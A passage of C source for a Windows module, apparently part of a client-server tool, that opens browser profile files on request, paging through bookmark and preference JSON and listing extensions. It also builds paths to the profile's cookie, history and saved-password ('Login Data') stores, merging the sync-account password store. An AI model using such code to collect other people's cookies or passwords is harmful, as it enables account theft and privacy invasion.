    ULONG ChildIndex;
    ZP_BROWSER_DOCUMENT_TYPE Type;
} ZP_BROWSER_JSON_NODE, *PZP_BROWSER_JSON_NODE;

typedef struct _ZP_BROWSER_DOCUMENT_SNAPSHOT
{
    ZP_CLIENT_SNAPSHOT Header;
    CO_MTA_USAGE_COOKIE MtaUsage;
    RTL_SRWLOCK Lock;
    PZP_BROWSER_JSON_NODE Nodes;
    PULONG NodeIndex;
    ULONG NodeCount;
    ULONG NodeCapacity;
    ULONG NodeIndexCapacity;
} ZP_BROWSER_DOCUMENT_SNAPSHOT, *PZP_BROWSER_DOCUMENT_SNAPSHOT;

static
VOID
NTAPI
ZpBrowser_DeleteDocumentSnapshot(
    _In_ PZP_CLIENT_SNAPSHOT Header)
{
    PZP_BROWSER_DOCUMENT_SNAPSHOT Snapshot = CONTAINING_RECORD(Header,
                                                                ZP_BROWSER_DOCUMENT_SNAPSHOT,
                                                                Header);
    ULONG Index;

    for (Index = 0; Index < Snapshot->NodeCount; Index++)
    {
        Snapshot->Nodes[Index].Value->lpVtbl->Release(Snapshot->Nodes[Index].Value);
    }
    if (Snapshot->MtaUsage != NULL) CoDecrementMTAUsage(Snapshot->MtaUsage);
    Mem_Free(Snapshot->NodeIndex);
    Mem_Free(Snapshot->Nodes);
    Mem_Free(Snapshot);
}

static
HRESULT
ZpBrowser_GetDocumentType(
    _In_ IJsonValue* Value,
    _Out_ ZP_BROWSER_DOCUMENT_TYPE* Type)
{
    JsonValueType JsonType;
    HRESULT Result = Value->lpVtbl->get_ValueType(Value, &JsonType);

    if (FAILED(Result)) return Result;
    switch (JsonType)
    {
    case JsonValueType_Object:
        *Type = ZpBrowserDocumentObject;
        break;
    case JsonValueType_Array:
        *Type = ZpBrowserDocumentArray;
        break;
    case JsonValueType_String:
        *Type = ZpBrowserDocumentString;
        break;
    case JsonValueType_Number:
        *Type = ZpBrowserDocumentNumber;
        break;
    case JsonValueType_Boolean:
        *Type = ZpBrowserDocumentBoolean;
        break;
    case JsonValueType_Null:
        *Type = ZpBrowserDocumentNull;
        break;
    default:
        return HRESULT_FROM_WIN32(ERROR_INVALID_DATA);
    }
    return S_OK;
}

static
HRESULT
ZpBrowser_GetDocumentChildCount(
    _In_ PZP_BROWSER_JSON_NODE Node,
    _Out_ PULONG Count)
{
    HRESULT Result;

    if (Node->Type == ZpBrowserDocumentArray)
    {
        IJsonArray* Value;
        IJsonVector* Array;

        Result = Node->Value->lpVtbl->GetArray(Node->Value, &Value);
        if (FAILED(Result)) return Result;
        Result = Value->lpVtbl->QueryInterface(Value,
                    &IID_IJsonVector, (PVOID*)&Array);
        Value->lpVtbl->Release(Value);
        if (FAILED(Result)) return Result;
        Result = Array->lpVtbl->get_Size(Array, Count);
        Array->lpVtbl->Release(Array);
    } else
    {
        IJsonObject* Value;
        IJsonMap* Object;

        Result = Node->Value->lpVtbl->GetObject(Node->Value, &Value);
        if (FAILED(Result)) return Result;
        Result = Value->lpVtbl->QueryInterface(Value,
                    &IID_IJsonMap, (PVOID*)&Object);
        Value->lpVtbl->Release(Value);
        if (FAILED(Result)) return Result;
        Result = Object->lpVtbl->get_Size(Object, Count);
        Object->lpVtbl->Release(Object);
    }
    return Result;
}

static
ULONG
ZpBrowser_HashDocumentChild(
    _In_ ULONG ParentId,
    _In_ ULONG ChildIndex,
    _In_ ULONG Capacity)
{
    ULONGLONG Value = ((ULONGLONG)ParentId << 32) | ChildIndex;

    Value ^= Value >> 33;
    Value *= 0xff51afd7ed558ccdULL;
    Value ^= Value >> 33;
    Value *= 0xc4ceb9fe1a85ec53ULL;
    Value ^= Value >> 33;
    return (ULONG)Value & (Capacity - 1);
}

static
VOID
ZpBrowser_InsertDocumentNodeIndex(
    _Inout_ PZP_BROWSER_DOCUMENT_SNAPSHOT Snapshot,
    _In_ ULONG NodeId)
{
    PZP_BROWSER_JSON_NODE Node = &Snapshot->Nodes[NodeId - 1];
    ULONG Slot = ZpBrowser_HashDocumentChild(Node->ParentId,
                                             Node->ChildIndex,
                                             Snapshot->NodeIndexCapacity);

    while (Snapshot->NodeIndex[Slot] != 0)
    {
        Slot = (Slot + 1) & (Snapshot->NodeIndexCapacity - 1);
    }
    Snapshot->NodeIndex[Slot] = NodeId;
}

static
NTSTATUS
ZpBrowser_GrowDocumentNodeIndex(
    _Inout_ PZP_BROWSER_DOCUMENT_SNAPSHOT Snapshot)
{
    ULONG Capacity = Snapshot->NodeIndexCapacity == 0 ? 256 : Snapshot->NodeIndexCapacity * 2;
    PULONG NodeIndex;
    ULONG NodeId;

    if (Capacity > ZP_CODEC_MAX_ELEMENT_COUNT * 2) return STATUS_QUOTA_EXCEEDED;
    NodeIndex = Mem_Alloc((SIZE_T)Capacity * sizeof(*NodeIndex));
    if (NodeIndex == NULL) return STATUS_NO_MEMORY;
    RtlZeroMemory(NodeIndex, (SIZE_T)Capacity * sizeof(*NodeIndex));
    Mem_Free(Snapshot->NodeIndex);
    Snapshot->NodeIndex = NodeIndex;
    Snapshot->NodeIndexCapacity = Capacity;
    for (NodeId = 2; NodeId <= Snapshot->NodeCount; NodeId++)
    {
        ZpBrowser_InsertDocumentNodeIndex(Snapshot, NodeId);
    }
    return STATUS_SUCCESS;
}

static
ULONG
ZpBrowser_FindDocumentNode(
    _In_ PZP_BROWSER_DOCUMENT_SNAPSHOT Snapshot,
    _In_ ULONG ParentId,
    _In_ ULONG ChildIndex)
{
    PZP_BROWSER_JSON_NODE Node;
    ULONG NodeId, Slot;

    if (Snapshot->NodeIndexCapacity == 0) return 0;
    Slot = ZpBrowser_HashDocumentChild(ParentId, ChildIndex, Snapshot->NodeIndexCapacity);
    for (;;)
    {
        NodeId = Snapshot->NodeIndex[Slot];
        if (NodeId == 0) return 0;
        Node = &Snapshot->Nodes[NodeId - 1];
        if (Node->ParentId == ParentId && Node->ChildIndex == ChildIndex) return NodeId;
        Slot = (Slot + 1) & (Snapshot->NodeIndexCapacity - 1);
    }
}

static
NTSTATUS
ZpBrowser_AddDocumentNode(
    _Inout_ PZP_BROWSER_DOCUMENT_SNAPSHOT Snapshot,
    _In_ IJsonValue* Value,
    _In_ ZP_BROWSER_DOCUMENT_TYPE Type,
    _In_ ULONG ParentId,
    _In_ ULONG ChildIndex,
    _Out_ PULONG NodeId)
{
    PZP_BROWSER_JSON_NODE Nodes;
    ULONG Capacity;
    NTSTATUS Status;

    if (Snapshot->NodeCount == ZP_CODEC_MAX_ELEMENT_COUNT) return STATUS_QUOTA_EXCEEDED;
    if (ParentId != 0 &&
        (Snapshot->NodeIndexCapacity == 0 ||
         Snapshot->NodeCount * 2 >= Snapshot->NodeIndexCapacity))
    {
        Status = ZpBrowser_GrowDocumentNodeIndex(Snapshot);
        if (!NT_SUCCESS(Status)) return Status;
    }
    if (Snapshot->NodeCount == Snapshot->NodeCapacity)
    {
        Capacity = Snapshot->NodeCapacity == 0 ? 256 : Snapshot->NodeCapacity * 2;
        if (Capacity > ZP_CODEC_MAX_ELEMENT_COUNT) Capacity = ZP_CODEC_MAX_ELEMENT_COUNT;
        Nodes = Mem_ReAlloc(Snapshot->Nodes, (SIZE_T)Capacity * sizeof(*Snapshot->Nodes));
        if (Nodes == NULL) return STATUS_NO_MEMORY;
        Snapshot->Nodes = Nodes;
        Snapshot->NodeCapacity = Capacity;
    }
    *NodeId = Snapshot->NodeCount + 1;
    Snapshot->Nodes[Snapshot->NodeCount].Value = Value;
    Snapshot->Nodes[Snapshot->NodeCount].ParentId = ParentId;
    Snapshot->Nodes[Snapshot->NodeCount].ChildIndex = ChildIndex;
    Snapshot->Nodes[Snapshot->NodeCount].Type = Type;
    Snapshot->NodeCount++;
    if (ParentId != 0) ZpBrowser_InsertDocumentNodeIndex(Snapshot, *NodeId);
    return STATUS_SUCCESS;
}

static
HRESULT
ZpBrowser_EncodeDocumentSnapshotPage(
    _In_ PZP_BROWSER_DOCUMENT_SNAPSHOT Snapshot,
    _In_ ULONG NodeId,
    _In_ ULONG Cursor,
    _In_ ULONG Limit,
    _Outptr_result_bytebuffer_(*ResponseLength) PBYTE* Response,
    _Out_ PULONG ResponseLength)
{
    ZP_BROWSER_DOCUMENT_NODE Records[ZP_BROWSER_DOCUMENT_PAGE_SIZE] = { 0 };
    HSTRING Names[ZP_BROWSER_DOCUMENT_PAGE_SIZE] = { 0 };
    HSTRING Values[ZP_BROWSER_DOCUMENT_PAGE_SIZE] = { 0 };
    IJsonVector* Array = NULL;
    IJsonMap* Object = NULL;
    IJsonPairIterator* Iterator = NULL;
    boolean HasCurrent;
    IJsonValue* Child;
    PZP_BROWSER_JSON_NODE Parent, Node;
    PBYTE Buffer;
    HSTRING Name;
    ZP_BROWSER_DOCUMENT_TYPE Type, ParentType;
    ULONG NameLength, ValueLength;
    ULONG ChildCount, ChildSize, ChildIndex;
    ULONG Count, Index, PageCount, EncodedLength, NextCursor = 0;
    HRESULT Result;

    RtlAcquireSRWLockExclusive(&Snapshot->Lock);
    if (NodeId == 0 || NodeId > Snapshot->NodeCount)
    {
        Result = E_INVALIDARG;
        goto Cleanup;
    }
    Parent = &Snapshot->Nodes[NodeId - 1];
    ParentType = Parent->Type;
    if (ParentType == ZpBrowserDocumentArray)
    {
        IJsonArray* Value;

        Result = Parent->Value->lpVtbl->GetArray(Parent->Value, &Value);
        if (FAILED(Result)) goto Cleanup;
        Result = Value->lpVtbl->QueryInterface(Value,
                    &IID_IJsonVector, (PVOID*)&Array);
        Value->lpVtbl->Release(Value);
        if (SUCCEEDED(Result)) Result = Array->lpVtbl->get_Size(Array, &ChildCount);
    } else if (ParentType == ZpBrowserDocumentObject)
    {
        IJsonObject* Value;

        Result = Parent->Value->lpVtbl->GetObject(Parent->Value, &Value);
        if (FAILED(Result)) goto Cleanup;
        Result = Value->lpVtbl->QueryInterface(Value,
                    &IID_IJsonMap, (PVOID*)&Object);
        Value->lpVtbl->Release(Value);
        if (SUCCEEDED(Result)) Result = Object->lpVtbl->get_Size(Object, &ChildCount);
    } else
    {
        Result = TYPE_E_TYPEMISMATCH;
    }
    if (FAILED(Result)) goto Cleanup;
    if (Cursor > ChildCount)
    {
        Result = E_INVALIDARG;
        goto Cleanup;
    }
    PageCount = min(Limit, ChildCount - Cursor);
    if (ParentType == ZpBrowserDocumentObject)
    {
        IJsonPairIterable* Iterable;

        Result = Object->lpVtbl->QueryInterface(Object,
                    &IID_IJsonPairIterable,
                    (PVOID*)&Iterable);
        if (FAILED(Result)) goto Cleanup;
        Result = Iterable->lpVtbl->First(Iterable, &Iterator);
        Iterable->lpVtbl->Release(Iterable);
        if (FAILED(Result)) goto Cleanup;
        for (Index = 0; Index < Cursor; Index++)
        {
            Result = Iterator->lpVtbl->MoveNext(Iterator, &HasCurrent);
            if (FAILED(Result)) goto Cleanup;
        }
    }
    for (Count = 0; Count < PageCount; Count++)
    {
        if (Array != NULL)
        {
            Result = Array->lpVtbl->GetAt(Array, Cursor + Count, &Child);
            Name = NULL;
        } else
        {
            IJsonPair* Pair;

            Result = Iterator->lpVtbl->get_Current(Iterator, &Pair);
            if (FAILED(Result)) goto Cleanup;
            Result = Pair->lpVtbl->get_Key(Pair, &Name);
            if (FAILED(Result))
            {
                Pair->lpVtbl->Release(Pair);
                goto Cleanup;
            }
            Result = Pair->lpVtbl->get_Value(Pair, &Child);
            Pair->lpVtbl->Release(Pair);
            if (FAILED(Result))
            {
                _Inline_WindowsDeleteString(Name);
                goto Cleanup;
            }
            Result = Iterator->lpVtbl->MoveNext(Iterator, &HasCurrent);
            if (FAILED(Result))
            {
                Child->lpVtbl->Release(Child);
                _Inline_WindowsDeleteString(Name);
            }
        }
        if (FAILED(Result)) goto Cleanup;
        Names[Count] = Name;
        ChildIndex = Cursor + Count;
        Records[Count].Id = ZpBrowser_FindDocumentNode(Snapshot, NodeId, ChildIndex);
        if (Records[Count].Id == 0)
        {
            Result = ZpBrowser_GetDocumentType(Child, &Type);
            if (SUCCEEDED(Result))
            {
                Result = HRESULT_FROM_NT(ZpBrowser_AddDocumentNode(Snapshot,
                                                   Child,
                                                   Type,
                                                   NodeId,
                                                   ChildIndex,
                                                   &Records[Count].Id));
            }
            if (FAILED(Result))
            {
                Child->lpVtbl->Release(Child);
                goto Cleanup;
            }
        }
        else
        {
            Child->lpVtbl->Release(Child);
        }
        Node = &Snapshot->Nodes[Records[Count].Id - 1];
        Records[Count].Type = Node->Type;
        Records[Count].Name = _Inline_WindowsGetStringRawBuffer(Names[Count], &NameLength);
        Records[Count].NameLength = NameLength;
        if (Node->Type == ZpBrowserDocumentObject || Node->Type == ZpBrowserDocumentArray)
        {
            Result = ZpBrowser_GetDocumentChildCount(Node, &ChildSize);
            if (FAILED(Result)) goto Cleanup;
            Records[Count].Flags = ChildSize != 0 ? ZP_BROWSER_DOCUMENT_NODE_HAS_CHILDREN : 0;
        }
        else
        {
            Result = Node->Value->lpVtbl->Stringify(Node->Value, &Values[Count]);
            if (FAILED(Result)) goto Cleanup;
            Records[Count].Value = _Inline_WindowsGetStringRawBuffer(Values[Count], &ValueLength);
            Records[Count].ValueLength = ValueLength;
        }
    }
    if (Cursor + Count < ChildCount) NextCursor = Cursor + Count;
    Result = HRESULT_FROM_NT(ZpBrowser_EncodeDocumentPage(Snapshot->Header.Id,
                                         ParentType,
                                         NextCursor,
                                         Records,
                                         Count,
                                         NULL,
                                         0,
                                         &EncodedLength));
    if (FAILED(Result)) goto Cleanup;
    Buffer = Mem_Alloc(EncodedLength);
    if (Buffer == NULL)
    {
        Result = E_OUTOFMEMORY;
        goto Cleanup;
    }
    Result = HRESULT_FROM_NT(ZpBrowser_EncodeDocumentPage(Snapshot->Header.Id,
                                         ParentType,
                                         NextCursor,
                                         Records,
                                         Count,
                                         Buffer,
                                         EncodedLength,
                                         ResponseLength));
    if (SUCCEEDED(Result)) *Response = Buffer;
    else Mem_Free(Buffer);
Cleanup:
    if (Iterator != NULL) Iterator->lpVtbl->Release(Iterator);
    if (Array != NULL) Array->lpVtbl->Release(Array);
    if (Object != NULL) Object->lpVtbl->Release(Object);
    for (Index = 0; Index < ZP_BROWSER_DOCUMENT_PAGE_SIZE; Index++)
    {
        _Inline_WindowsDeleteString(Values[Index]);
        _Inline_WindowsDeleteString(Names[Index]);
    }
    RtlReleaseSRWLockExclusive(&Snapshot->Lock);
    return Result;
}

static
ZP_STATUS
ZpBrowser_OpenDocument(
    _Inout_ PZP_CLIENT_OBJECT Client,
    _In_ PCWSTR Path,
    _In_ LOGICAL MissingAllowed,
    _Outptr_result_bytebuffer_(*ResponseLength) PBYTE* Response,
    _Out_ PULONG ResponseLength)
{
    static const CHAR EmptyObject[] = "{}";
    PZP_BROWSER_DOCUMENT_SNAPSHOT Snapshot;
    IJsonValue* Root = NULL;
    ZP_BROWSER_DOCUMENT_TYPE RootType;
    ULONG RootId;
    HRESULT Result;

    Snapshot = Mem_Alloc(sizeof(*Snapshot));
    if (Snapshot == NULL) return ZpStatus_FromNtStatus(STATUS_NO_MEMORY);
    RtlZeroMemory(Snapshot, sizeof(*Snapshot));
    // Keep the MTA alive while JSON values are retained between requests.
    Result = CoIncrementMTAUsage(&Snapshot->MtaUsage);
    if (FAILED(Result))
    {
        Mem_Free(Snapshot);
        return ZpStatus_FromCode(ZpStatusHResult, Result);
    }
    Result = ZpBrowser_OpenJsonDocument(Path, &Root);
    if (MissingAllowed && ZpBrowser_IsDocumentMissing(Result))
    {
        Result = Data_JsonParseUtf8(EmptyObject, sizeof(EmptyObject) - 1, &Root);
    }
    if (SUCCEEDED(Result)) Result = ZpBrowser_GetDocumentType(Root, &RootType);
    if (SUCCEEDED(Result) &&
        RootType != ZpBrowserDocumentObject && RootType != ZpBrowserDocumentArray)
    {
        Result = TYPE_E_TYPEMISMATCH;
    }
    if (SUCCEEDED(Result))
    {
        Result = HRESULT_FROM_NT(ZpBrowser_AddDocumentNode(Snapshot, Root, RootType, 0, 0, &RootId));
        if (SUCCEEDED(Result)) Root = NULL;
    }
    if (FAILED(Result))
    {
        if (Root != NULL) Root->lpVtbl->Release(Root);
        ZpBrowser_DeleteDocumentSnapshot(&Snapshot->Header);
        return ZpStatus_FromCode(ZpStatusHResult, Result);
    }
    ZpClientSnapshot_Add(Client,
                         &Snapshot->Header,
                         ZP_BROWSER_MODULE_ID,
                         ZpBrowser_DeleteDocumentSnapshot);
    Result = ZpBrowser_EncodeDocumentSnapshotPage(Snapshot,
                                                  RootId,
                                                  0,
                                                  ZP_BROWSER_DOCUMENT_PAGE_SIZE,
                                                  Response,
                                                  ResponseLength);
    if (FAILED(Result))
    {
        ZpClientSnapshot_Close(Client, ZP_BROWSER_MODULE_ID, Snapshot->Header.Id);
    }
    return ZpStatus_FromCode(ZpStatusHResult, Result);
}

static
ZP_STATUS
ZpBrowser_QueryDocumentNode(
    _Inout_ PZP_CLIENT_OBJECT Client,
    _In_ ULONG SnapshotId,
    _In_ ULONG NodeId,
    _In_ ULONG Cursor,
    _In_ ULONG Limit,
    _Outptr_result_bytebuffer_(*ResponseLength) PBYTE* Response,
    _Out_ PULONG ResponseLength)
{
    PZP_BROWSER_DOCUMENT_SNAPSHOT Snapshot = (PZP_BROWSER_DOCUMENT_SNAPSHOT)
        ZpClientSnapshot_Reference(Client, ZP_BROWSER_MODULE_ID, SnapshotId);
    HRESULT Result;

    if (Snapshot == NULL) return ZpStatus_FromNtStatus(STATUS_NOT_FOUND);
    Result = ZpBrowser_EncodeDocumentSnapshotPage(Snapshot,
                                                  NodeId,
                                                  Cursor,
                                                  Limit,
                                                  Response,
                                                  ResponseLength);
    ZpClientSnapshot_Dereference(&Snapshot->Header);
    return ZpStatus_FromCode(ZpStatusHResult, Result);
}

static
ZP_STATUS
ZpBrowser_QueryDocument(
    _In_ PCZP_BROWSER_QUERY_VIEW Query,
    _In_ PCWSTR Path,
    _Outptr_result_bytebuffer_(*ResponseLength) PBYTE* Response,
    _Out_ PULONG ResponseLength)
{
    ZP_BROWSER_BUILDER Builder = { 0 };
    IJsonValue* Root = NULL;
    HSTRING Text = NULL;
    HRESULT Result;

    Result = ZpBrowser_OpenJsonDocument(Path, &Root);
    if (Query->Kind == ZpBrowserKindBookmark && ZpBrowser_IsDocumentMissing(Result)) Result = S_OK;
    else if (SUCCEEDED(Result))
    {
        Result = Root->lpVtbl->Stringify(Root, &Text);
        if (SUCCEEDED(Result))
        {
            Result = HRESULT_FROM_NT(ZpBrowser_AddRecord(&Builder,
                                         Query->Kind,
                                         Query->Browser,
                                         0,
                                         NULL,
                                         L"",
                                         NULL,
                                         Path,
                                         _Inline_WindowsGetStringRawBuffer(Text, NULL)));
        }
    }
    _Inline_WindowsDeleteString(Text);
    if (Root != NULL) Root->lpVtbl->Release(Root);
    if (SUCCEEDED(Result)) Result = HRESULT_FROM_NT(ZpBrowser_EncodeBuilder(&Builder, 0, Response, ResponseLength));
    ZpBrowser_FreeBuilder(&Builder);
    return ZpStatus_FromCode(ZpStatusHResult, Result);
}

static
ZP_STATUS
ZpBrowser_QueryExtensions(
    _In_ PCZP_BROWSER_QUERY_VIEW Query,
    _In_ PCWSTR Path,
    _Outptr_result_bytebuffer_(*ResponseLength) PBYTE* Response,
    _Out_ PULONG ResponseLength)
{
    ZP_BROWSER_BUILDER Builder = { 0 };
    WIN32_FIND_DATAW Data;
    WCHAR Pattern[MAX_PATH], Location[MAX_PATH];
    HANDLE Find;
    NTSTATUS Status;

    Status = StringCchPrintfW(Pattern, ARRAYSIZE(Pattern), L"%s\\*", Path);
    if (!NT_SUCCESS(Status)) return ZpStatus_FromNtStatus(Status);
    Find = FindFirstFileExW(Pattern, FindExInfoBasic, &Data, FindExSearchLimitToDirectories, NULL, 0);
    if (Find == INVALID_HANDLE_VALUE)
    {
        ULONG Error = GetLastError();

        return Error == ERROR_FILE_NOT_FOUND || Error == ERROR_PATH_NOT_FOUND ?
                   ZpStatus_FromNtStatus(
                       ZpBrowser_EncodeBuilder(&Builder, 0, Response, ResponseLength)) :
                   ZpStatus_FromCode(ZpStatusWin32, Error);
    }
    do
    {
        if (!(Data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) || Data.cFileName[0] == L'.') continue;
        if (FAILED(StringCchPrintfW(Location,
                                     ARRAYSIZE(Location),
                                     L"%s\\%s",
                                     Path,
                                     Data.cFileName)))
        {
            continue;
        }
        Status = ZpBrowser_AddRecord(&Builder,
                                     ZpBrowserKindExtension,
                                     Query->Browser,
                                     0,
                                     NULL,
                                     Data.cFileName,
                                     NULL,
                                     Location,
                                     NULL);
    } while (NT_SUCCESS(Status) && FindNextFileW(Find, &Data));
    FindClose(Find);
    if (NT_SUCCESS(Status)) Status = ZpBrowser_EncodeBuilder(&Builder, 0, Response, ResponseLength);
    ZpBrowser_FreeBuilder(&Builder);
    return ZpStatus_FromNtStatus(Status);
}

static
ZP_STATUS
ZpBrowser_Query(
    _In_ PCZP_BROWSER_QUERY_VIEW Query,
    _Outptr_result_bytebuffer_(*ResponseLength) PBYTE* Response,
    _Out_ PULONG ResponseLength)
{
    WCHAR UserData[MAX_PATH], Profile[MAX_PATH], Path[MAX_PATH], MergedPath[MAX_PATH];
    PCWSTR MergedDatabasePath = NULL;
    NTSTATUS Status;

    Status = ZpBrowser_CopyProfile(&Query->Profile, Profile);
    if (NT_SUCCESS(Status)) Status = ZpBrowser_GetUserData(Query->Browser, &Query->UserData, UserData);
    if (NT_SUCCESS(Status))
    {
        Status = StringCchPrintfW(Path,
                                  ARRAYSIZE(Path),
                                  Query->Kind == ZpBrowserKindCookie ? L"%s\\%s\\Network\\Cookies" :
                                  Query->Kind == ZpBrowserKindPassword ? L"%s\\%s\\Login Data" :
                                  Query->Kind == ZpBrowserKindBookmark ? L"%s\\%s\\Bookmarks" :
                                  Query->Kind == ZpBrowserKindSetting ? L"%s\\%s\\Preferences" :
                                  Query->Kind == ZpBrowserKindExtension ? L"%s\\%s\\Extensions" :
                                                                         L"%s\\%s\\History",
                                  UserData,
                                  Profile);
    }
    if (NT_SUCCESS(Status) && Query->Kind == ZpBrowserKindPassword)
    {
        /* sync-signed-in passwords live in a sibling store, merged in with dedupe */
        Status = StringCchPrintfW(MergedPath,
                                  ARRAYSIZE(MergedPath),
                                  L"%s\\%s\\Login Data For Account",
                                  UserData,
                                  Profile);
        if (NT_SUCCESS(Status)) MergedDatabasePath = MergedPath;
    }
    if (!NT_SUCCESS(Status)) return ZpStatus_FromNtStatus(Status);
    if (Query->Kind == ZpBrowserKindHistory || Query->Kind == ZpBrowserKindDownload ||
        Query->Kind == ZpBrowserKindCookie || Query->Kind == ZpBrowserKindPassword)
    {
        return ZpBrowser_QueryDatabase(Query,
                                       UserData,
                                       Path,
                                       MergedDatabasePath,
                                       Response,
                                       ResponseLength);
    }
    if (Query->Kind == ZpBrowserKindBookmark || Query->Kind == ZpBrowserKindSetting)
    {
        return ZpBrowser_QueryDocument(Query, Path, Response, ResponseLength);
    }
    return ZpBrowser_QueryExtensions(Query, Path, Response, ResponseLength);
}

static
ZP_STATUS
ZpBrowser_OpenDocumentQuery(
    _Inout_ PZP_CLIENT_OBJECT Client,
    _In_ PCZP_BROWSER_QUERY_VIEW Query,
    _Outptr_result_bytebuffer_(*ResponseLength) PBYTE* Response,
    _Out_ PULONG ResponseLength)
{
    WCHAR UserData[MAX_PATH], Profile[MAX_PATH], Path[MAX_PATH];
    NTSTATUS Status;

    if (Query->Kind != ZpBrowserKindBookmark && Query->Kind != ZpBrowserKindSetting)
    {
        return ZpStatus_FromNtStatus(STATUS_INVALID_PARAMETER);
    }
    Status = ZpBrowser_CopyProfile(&Query->Profile, Profile);
    if (NT_SUCCESS(Status)) Status = ZpBrowser_GetUserData(Query->Browser, &Query->UserData, UserData);
    if (NT_SUCCESS(Status))
    {
        Status = StringCchPrintfW(Path,
                                  ARRAYSIZE(Path),
                                  Query->Kind == ZpBrowserKindBookmark ? L"%s\\%s\\Bookmarks" :
                                                                        L"%s\\%s\\Preferences",
                                  UserData,
                                  Profile);
    }
    return NT_SUCCESS(Status) ?
               ZpBrowser_OpenDocument(Client,
                                      Path,
                                      Query->Kind == ZpBrowserKindBookmark,
                                      Response,
                                      ResponseLength) :
               ZpStatus_FromNtStatus(Status);
}

static
ZP_STATUS
ZpBrowser_ExecuteRequest(
    _Inout_ PZP_CLIENT_OBJECT Client,
    _In_ BYTE OperationId,
    _In_reads_bytes_opt_(RequestLength) const VOID* Request,
    _In_ ULONG RequestLength,
    _Outptr_result_bytebuffer_maybenull_(*ResponseLength) PBYTE* Response,
    _Out_ PULONG ResponseLength)
{
    ZP_BROWSER_QUERY_VIEW Query;
    ZP_BROWSER_TYPE Browser;
    ZP_STRING_VIEW Profile, UserData;
    ULONG SnapshotId, NodeId, Cursor, Limit;
    NTSTATUS Status;

    if (OperationId == ZP_BROWSER_OPERATION_ENUMERATE)
    {
        return RequestLength == 0 ?
                   ZpBrowser_Enumerate(Response, ResponseLength) :
                   ZpStatus_FromNtStatus(STATUS_INVALID_PARAMETER);
    }
    if (OperationId == ZP_BROWSER_OPERATION_QUERY)
    {
        Status = ZpBrowser_DecodeQuery(Request, RequestLength, &Query);
        return NT_SUCCESS(Status) ?
                   ZpBrowser_Query(&Query, Response, ResponseLength) :
                   ZpStatus_FromNtStatus(Status);
    }
    if (OperationId == ZP_BROWSER_OPERATION_OPEN_DOCUMENT)
    {
        Status = ZpBrowser_DecodeQuery(Request, RequestLength, &Query);
        return NT_SUCCESS(Status) ?
                   ZpBrowser_OpenDocumentQuery(Client, &Query, Response, ResponseLength) :
                   ZpStatus_FromNtStatus(Status);
    }
    if (OperationId == ZP_BROWSER_OPERATION_QUERY_DOCUMENT_NODE)
    {
        Status = ZpBrowser_DecodeDocumentQuery(Request,
                                               RequestLength,
                                               &SnapshotId,
                                               &NodeId,
                                               &Cursor,
                                               &Limit);
        return NT_SUCCESS(Status) ?
                   ZpBrowser_QueryDocumentNode(Client,
                                               SnapshotId,
                                               NodeId,
                                               Cursor,
                                               Limit,
                                               Response,
                                               ResponseLength) :
                   ZpStatus_FromNtStatus(Status);
    }
    if (OperationId == ZP_BROWSER_OPERATION_CLOSE_DOCUMENT)
    {
        Status = ZpBrowser_DecodeDocumentClose(Request, RequestLength, &SnapshotId);
        if (NT_SUCCESS(Status)) Status = ZpClientSnapshot_Close(Client, ZP_BROWSER_MODULE_ID, SnapshotId);
        return ZpStatus_FromNtStatus(Status);
    }
    if (OperationId == ZP_BROWSER_OPERATION_INSPECT_PROFILE)
    {
        Status = ZpBrowser_DecodeProfileInspectionRequest(Request,
                                                          RequestLength,
                                                          &Browser,
                                                          &Profile,
                                                          &UserData);
        return NT_SUCCESS(Status) ?
                   ZpBrowser_InspectProfile(Browser, &Profile, &UserData, Response, ResponseLength) :
                                    ZpStatus_FromNtStatus(Status);
    }
    return ZpStatus_FromNtStatus(STATUS_NOT_SUPPORTED);
}

ZP_STATUS
ZpBrowser_Execute(
    _Inout_ PZP_CLIENT_OBJECT Client,
    _In_ BYTE OperationId,
    _In_reads_bytes_opt_(RequestLength) const VOID* Request,
    _In_ ULONG RequestLength,
    _Outptr_result_bytebuffer_maybenull_(*ResponseLength) PBYTE* Response,
    _Out_ PULONG ResponseLength)
{
    HRESULT Result = RoInitialize(RO_INIT_MULTITHREADED);
    ZP_STATUS Status;

    if (FAILED(Result)) return ZpStatus_FromCode(ZpStatusHResult, Result);
    Status = ZpBrowser_ExecuteRequest(Client, OperationId, Request, RequestLength, Response, ResponseLength);
    RoUninitialize();
    return Status;
}
